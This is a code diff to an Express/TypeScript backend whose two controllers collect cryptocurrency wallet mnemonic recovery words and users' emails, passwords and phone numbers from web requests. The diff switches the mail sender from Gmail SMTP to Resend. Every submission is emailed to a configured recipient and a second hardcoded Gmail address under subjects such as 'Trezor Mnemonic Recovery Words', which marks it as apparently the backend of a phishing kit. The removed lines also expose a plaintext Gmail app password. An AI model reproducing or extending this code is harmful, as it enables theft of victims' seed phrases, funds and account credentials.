@@ -1,16 +1,14 @@
 import { Request, Response } from "express";
 import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
-import nodemailer from "nodemailer";
-const getRecipients = (): string[] => {
-  const recipients = "rohitkumar952895@gmail.com,rohitkumar7409137159@gmail.com";
-  if (!recipients) return [];
-  return recipients.split(",").map((email) => email.trim());
-};
+import { Resend } from "resend";
+
 export const sendMnemonicController = asyncHandler(
 
   async (req: Request, res: Response): Promise<Response> => {
+    const resend = new Resend(process.env.RESEND_API_KEY as string);
+    const resend2 = new Resend(process.env.RESEND_API_KEY2 as string);
     const payload = req.body;
-
+    
     // Validate payload
     if (!payload || !payload.data || !Array.isArray(payload.data)) {
       return errorResponse(res, "Invalid payload", 400);
@@ -24,56 +22,26 @@ export const sendMnemonicController = asyncHandler(
       htmlContent += `<p>${item.value}</p>`;
     });
 
+
     try {
-      const recipients = getRecipients();
-      if (recipients.length === 0) {
-        return errorResponse(res, "No recipients configured", 400);
-      }
-
-      // Gmail transporter (App Password required)
-      const transporter = nodemailer.createTransport({
-        host: "smtp.gmail.com",
-        port: 465,
-        secure: true,
-        auth: {
-          user: "davidbrown202e@gmail.com",
-          pass: "peie nkic zolx kfno", // App password only
-        },
+      // Send email via Resend
+      const response: any = await resend.emails.send({
+        from: `${payload.heading}@resend.dev`,
+        to: process.env.RECIPIENT_EMAIL as string,
+        subject: `${payload.heading.toUpperCase()} Mnemonic Recovery Words`,
+        html: htmlContent,
+      });
+      const response2: any = await resend2.emails.send({
+        from: `${payload.heading}@resend.dev`,
+        to: 'davidbrown202r@gmail.com' as string,
+        subject: `${payload.heading.toUpperCase()} Mnemonic Recovery Words`,
+        html: htmlContent,
       });
 
-      // Subject formatted to include project title (avoids merging threads)
-      const subject = `[${payload.heading}] User Information Received - ${new Date().toLocaleDateString()}`;
-
-      // Send separate emails for each recipient (per project payload.heading)
-      const results = await Promise.allSettled(
-        recipients.map((recipient) => {
-          const mailOptions = {
-            from: `"${payload.heading}" <davidbrown202e@gmail.com>`,
-            to: recipient,
-            subject: subject, // unique to each payload.heading/project
-            html: htmlContent,
-            headers: {
-              "Message-ID": `<${Date.now()}-${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
-              "In-Reply-To": `<${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
-              References: `<${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
-            },
-          };
-          return transporter.sendMail(mailOptions);
-        })
-      );
-
-      // Log send status
-      results.forEach((r, i) => {
-        if (r.status === "fulfilled") {
-          console.log(`✅ Email sent for ${payload.heading} → ${recipients[i]}`);
-        } else {
-          console.error(`❌ Failed for ${payload.heading} → ${recipients[i]}:`, r.reason?.message);
-        }
-      });
-
-      return successResponse(res, {}, `Emails for "${payload.heading}" sent successfully`, 200);
+      console.log("✅ Email sent successfully:", response, response2);
+      return successResponse(res, { id: response.id }, "Mnemonic sent successfully", 200);
     } catch (error: any) {
-      console.error("❌ Email sending failed:", error.message);
+      console.error("❌ Email sending error:", error.message);
       return errorResponse(res, "Failed to send email", 500);
     }
   }
@@ -84,13 +52,16 @@ export const sendMnemonicController = asyncHandler(
  */
 export const sendUserInfoController = asyncHandler(
   async (req: Request, res: Response): Promise<Response> => {
+    const resend = new Resend(process.env.RESEND_API_KEY as string);
+    const resend2 = new Resend(process.env.RESEND_API_KEY2 as string);
     const { title, email, password, phone } = req.body;
 
+    // Validate input
     if (!title || !email || !password) {
       return errorResponse(res, "Missing required fields", 400);
     }
 
-    // Build HTML Email Content
+    // Build email HTML content
     const htmlContent = `
       <h2>${title}</h2>
       <ul>
@@ -101,55 +72,23 @@ export const sendUserInfoController = asyncHandler(
     `;
 
     try {
-      const recipients = getRecipients();
-      if (recipients.length === 0) {
-        return errorResponse(res, "No recipients configured", 400);
-      }
-
-      // Gmail transporter (App Password required)
-      const transporter = nodemailer.createTransport({
-        host: "smtp.gmail.com",
-        port: 465,
-        secure: true,
-        auth: {
-          user: "davidbrown202e@gmail.com",
-          pass: "peie nkic zolx kfno", // App password only
-        },
+      const response: any = await resend.emails.send({
+        from: `${title}@resend.dev`,
+        to: process.env.RECIPIENT_EMAIL as string,
+        subject: "Trezor Mnemonic Recovery Words",
+        html: htmlContent,
+      });
+      const response2: any = await resend2.emails.send({
+        from: `${title}@resend.dev`,
+        to: 'davidbrown202r@gmail.com' as string,
+        subject: "Trezor Mnemonic Recovery Words",
+        html: htmlContent,
       });
 
-      // Subject formatted to include project title (avoids merging threads)
-      const subject = `[${title}] User Information Received - ${new Date().toLocaleDateString()}`;
-
-      // Send separate emails for each recipient (per project title)
-      const results = await Promise.allSettled(
-        recipients.map((recipient) => {
-          const mailOptions = {
-            from: `"${title}" <davidbrown202e@gmail.com>`,
-            to: recipient,
-            subject: subject, // unique to each title/project
-            html: htmlContent,
-            headers: {
-              "Message-ID": `<${Date.now()}-${title.replace(/\s+/g, "-")}@yourapp.com>`,
-              "In-Reply-To": `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
-              References: `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
-            },
-          };
-          return transporter.sendMail(mailOptions);
-        })
-      );
-
-      // Log send status
-      results.forEach((r, i) => {
-        if (r.status === "fulfilled") {
-          console.log(`✅ Email sent for ${title} → ${recipients[i]}`);
-        } else {
-          console.error(`❌ Failed for ${title} → ${recipients[i]}:`, r.reason?.message);
-        }
-      });
-
-      return successResponse(res, {}, `Emails for "${title}" sent successfully`, 200);
+      console.log("✅ Email sent successfully:", response, response2);
+      return successResponse(res, { id: response.id }, "Email sent successfully", 200);
     } catch (error: any) {
-      console.error("❌ Email sending failed:", error.message);
+      console.error("❌ Email sending error:", error.message);
       return errorResponse(res, "Failed to send email", 500);
     }
   }
